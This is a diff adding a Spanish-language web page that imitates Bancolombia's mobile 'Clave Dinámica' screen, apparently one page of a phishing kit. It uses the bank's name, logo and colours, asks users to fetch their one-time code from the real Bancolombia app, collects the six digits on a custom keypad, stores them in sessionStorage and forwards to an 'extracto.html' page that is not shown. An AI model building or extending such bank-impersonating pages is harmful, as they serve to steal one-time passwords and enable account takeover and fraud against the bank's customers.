@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ingresa la Clave Dinámica - Bancolombia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- ESTILOS GENERALES --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent; /* Quita el resaltado azul al tocar */
+        }
+
+        body {
+            background-color: #ffffff; 
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        .mobile-container {
+            width: 100%; 
+            max-width: 100%; 
+            background-color: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (min-width: 600px) {
+            .mobile-container {
+                max-width: 450px;
+                box-shadow: 0 0 20px rgba(0,0,0,0.1);
+                margin: 0 auto;
+            }
+        }
+
+        /* --- HEADER --- */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            background-color: #fff;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .close-icon {
+            font-size: 24px;
+            color: #666;
+            text-decoration: none;
+            font-weight: 300;
+        }
+
+        .header-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .header-right img {
+            height: 20px; 
+        }
+
+        /* --- CONTENIDO PRINCIPAL --- */
+        .content {
+            padding: 30px 25px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .main-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .subtitle strong {
+            color: #222;
+        }
+
+        /* --- INPUTS DE CLAVE --- */
+        .key-input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .lock-icon {
+            margin-bottom: 15px;
+        }
+
+        .lock-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: none;
+            stroke: #444;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .input-label {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 15px;
+        }
+
+        .digits-container {
+            display: flex;
+            gap: 12px;
+        }
+
+        /* Cajas falsas que simulan los inputs (No abren teclado) */
+        .digit-box {
+            width: 25px;
+            height: 30px;
+            border-bottom: 2px solid #333;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 2px;
+        }
+
+        /* --- BOTÓN CONTINUAR --- */
+        .btn-continue {
+            width: 100%;
+            background-color: #DCDCDC; 
+            color: #888;
+            border: none;
+            padding: 14px;
+            border-radius: 25px; 
+            font-size: 16px;
+            font-weight: 700;
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .btn-continue.active {
+            background-color: #FDDA24; 
+            color: #000;
+            cursor: pointer;
+        }
+
+        /* --- TECLADO NUMÉRICO --- */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: auto; 
+        }
+
+        .key-btn {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 15px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            transition: background-color 0.1s;
+        }
+
+        .key-btn:active {
+            background-color: #f0f0f0;
+        }
+
+        .key-number {
+            font-size: 24px;
+            font-weight: 400;
+            color: #222;
+            line-height: 1;
+        }
+
+        .key-letters {
+            font-size: 9px;
+            color: #888;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .key-btn.action {
+            background-color: transparent;
+            box-shadow: none;
+        }
+
+        .key-btn.action svg {
+            width: 24px;
+            height: 24px;
+            fill: none;
+            stroke: #333;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-left">
+                <a href="index.html" class="close-icon">&times;</a>
+                <span class="header-title">Ingresa la Clave Dinámica</span>
+            </div>
+            <div class="header-right">
+                <img src="logo.png" alt="Bancolombia">
+            </div>
+        </header>
+
+        <!-- Contenido -->
+        <main class="content">
+            <h1 class="main-title">Ingresa la Clave Dinámica</h1>
+            <p class="subtitle">
+                Ve a la app anterior <strong>"Bancolombia Personas"</strong> y tráela para continuar.
+            </p>
+
+            <!-- Inputs -->
+            <div class="key-input-container">
+                <div class="lock-icon">
+                    <svg viewBox="0 0 24 24">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                </div>
+                <span class="input-label">Ingresa la Clave Dinámica</span>
+                
+                <div class="digits-container" id="digits-container">
+                    <!-- Ahora son DIVs, no inputs. No abren teclado -->
+                    <div class="digit-box"></div>
+                    <div class="digit-box"></div>
+                    <div class="digit-box"></div>
+                    <div class="digit-box"></div>
+                    <div class="digit-box"></div>
+                    <div class="digit-box"></div>
+                </div>
+            </div>
+
+            <!-- Botón -->
+            <button id="btn-continue" class="btn-continue" disabled>Continuar</button>
+
+            <!-- Teclado Numérico -->
+            <div class="keypad" id="keypad">
+                <button class="key-btn" data-key="1"><span class="key-number">1</span></button>
+                <button class="key-btn" data-key="2"><span class="key-number">2</span><span class="key-letters">ABC</span></button>
+                <button class="key-btn" data-key="3"><span class="key-number">3</span><span class="key-letters">DEF</span></button>
+                
+                <button class="key-btn" data-key="4"><span class="key-number">4</span><span class="key-letters">GHI</span></button>
+                <button class="key-btn" data-key="5"><span class="key-number">5</span><span class="key-letters">JKL</span></button>
+                <button class="key-btn" data-key="6"><span class="key-number">6</span><span class="key-letters">MNO</span></button>
+                
+                <button class="key-btn" data-key="7"><span class="key-number">7</span><span class="key-letters">PQRS</span></button>
+                <button class="key-btn" data-key="8"><span class="key-number">8</span><span class="key-letters">TUV</span></button>
+                <button class="key-btn" data-key="9"><span class="key-number">9</span><span class="key-letters">WXYZ</span></button>
+                
+                <button class="key-btn action" disabled></button> 
+                <button class="key-btn" data-key="0"><span class="key-number">0</span></button>
+                <button class="key-btn action" id="btn-backspace">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                        <line x1="18" y1="9" x2="12" y2="15"></line>
+                        <line x1="12" y1="9" x2="18" y2="15"></line>
+                    </svg>
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Ahora seleccionamos los DIVs en lugar de inputs
+        const digitBoxes = document.querySelectorAll('.digit-box');
+        const btnContinue = document.getElementById('btn-continue');
+        const keypad = document.getElementById('keypad');
+        const btnBackspace = document.getElementById('btn-backspace');
+        
+        let currentIndex = 0;
+
+        // Función para actualizar el estado del botón
+        function checkButtonState() {
+            // Verifica si todas las cajas tienen texto
+            const allFilled = Array.from(digitBoxes).every(box => box.textContent !== '');
+            
+            if (allFilled) {
+                btnContinue.classList.add('active');
+                btnContinue.disabled = false;
+            } else {
+                btnContinue.classList.remove('active');
+                btnContinue.disabled = true;
+            }
+        }
+
+        // Lógica del teclado virtual
+        keypad.addEventListener('click', (e) => {
+            const btn = e.target.closest('.key-btn');
+            if (!btn || btn.disabled) return;
+
+            const key = btn.getAttribute('data-key');
+            
+            if (key && currentIndex < 6) {
+                // Escribir el número en la caja actual
+                digitBoxes[currentIndex].textContent = key;
+                currentIndex++;
+                checkButtonState();
+            }
+        });
+
+        // Lógica del botón borrar (Backspace)
+        btnBackspace.addEventListener('click', () => {
+            if (currentIndex > 0) {
+                currentIndex--;
+                digitBoxes[currentIndex].textContent = '';
+                checkButtonState();
+            }
+        });
+
+        // Permitir escribir con el teclado físico (solo para pruebas en PC)
+        document.addEventListener('keydown', (e) => {
+            if (e.key >= '0' && e.key <= '9' && currentIndex < 6) {
+                digitBoxes[currentIndex].textContent = e.key;
+                currentIndex++;
+                checkButtonState();
+            } else if (e.key === 'Backspace' && currentIndex > 0) {
+                currentIndex--;
+                digitBoxes[currentIndex].textContent = '';
+                checkButtonState();
+            }
+        });
+
+        // Lógica para pasar a extracto.html
+        btnContinue.addEventListener('click', () => {
+            if (!btnContinue.disabled) {
+                // Si necesitas guardar la clave para usarla en extracto.html:
+                const claveDinamica = Array.from(digitBoxes).map(box => box.textContent).join('');
+                sessionStorage.setItem('claveDinamica', claveDinamica);
+                
+                window.location.href = 'extracto.html';
+            }
+        });
+    </script>
+
+</body>
+</html>
